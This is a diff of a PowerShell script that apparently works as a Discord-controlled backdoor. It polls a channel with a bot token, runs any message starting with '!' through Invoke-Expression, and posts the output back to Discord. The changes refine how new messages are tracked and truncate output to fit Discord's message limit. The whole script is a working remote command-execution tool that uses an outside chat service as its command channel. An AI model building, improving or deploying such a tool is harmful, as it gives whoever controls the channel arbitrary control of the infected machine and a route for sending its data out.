@@ -11,9 +11,6 @@ $client = New-Object System.Net.Http.HttpClient
 $client.DefaultRequestHeaders.Authorization = "Bot $token"
 $client.DefaultRequestHeaders.Accept.Add("application/json")
 
-# Variable to store the latest message ID processed
-$global:lastMessageId = $null
-
 # Function to send a message to Discord
 function Send-DiscordMessage {
     param (
@@ -43,16 +40,15 @@ function Send-DiscordMessage {
     }
 }
 
-# Function to execute any command sent via Discord
-function Execute-Command {
+# Function to execute a PowerShell command
+function Execute-PowerShellCommand {
     param (
         [string]$command
     )
 
     try {
-        # Run the command
-        $output = Invoke-Expression $command
-
+        # Run the PowerShell command and capture the output
+        $output = Invoke-Expression $command  # Runs the PowerShell command
         if ($output) {
             $result = $output -join "`n"  # Join multiline output for Discord message
         } else {
@@ -62,7 +58,11 @@ function Execute-Command {
         $result = "Error executing command: $_"
     }
 
-    # Send the output to Discord
+    # Limit output to a reasonable size for Discord
+    if ($result.Length -gt 2000) {
+        $result = $result.Substring(0, 1997) + "..."
+    }
+
     Send-DiscordMessage -Message $result
 }
 
@@ -86,43 +86,32 @@ function Get-DiscordMessages {
     }
 }
 
-# Function to filter out old messages and only process new ones
-function Filter-NewMessages {
-    param (
-        [array]$messages
-    )
-
-    $newMessages = @()
-    foreach ($message in $messages) {
-        # If there is no last processed message ID, set it to the first one we encounter
-        if (-not $global:lastMessageId) {
-            $global:lastMessageId = $message.id
-            continue
-        }
-
-        # Only add messages that are more recent than the last processed one
-        if ($message.id -gt $global:lastMessageId) {
-            $newMessages += $message
-            $global:lastMessageId = $message.id  # Update last processed message ID
-        }
+# Initialize the bot by setting the last processed message ID
+function Initialize-LastMessageId {
+    $messages = Get-DiscordMessages
+    if ($messages) {
+        # Set $lastMessageId to the ID of the most recent message so old messages are ignored
+        $global:lastMessageId = $messages[0].id
+        Write-Host "Bot initialized. Ignoring messages before ID: $lastMessageId"
     }
-    return $newMessages
 }
+
+# Initialize the bot
+Initialize-LastMessageId
 
 # Main loop with rate limiting and command filtering
 while ($true) {
     $messages = Get-DiscordMessages
 
     if ($messages) {
-        $newMessages = Filter-NewMessages -messages $messages
-
-        foreach ($message in $newMessages) {
-            # Process only if it's not sent by the bot itself
-            if ($message.author.id -ne $botUserId) {
+        foreach ($message in $messages) {
+            # Process only if it's a new message and it's not sent by the bot itself
+            if ($message.id -gt $lastMessageId -and $message.author.id -ne $botUserId) {
                 if ($message.content.StartsWith("!")) {
                     $command = $message.content.Substring(1)  # Remove the "!" but do not convert to lowercase
-                    Execute-Command -command $command
+                    Execute-PowerShellCommand -command $command
                 }
+                $lastMessageId = $message.id  # Update the last processed message ID
             }
         }
     }
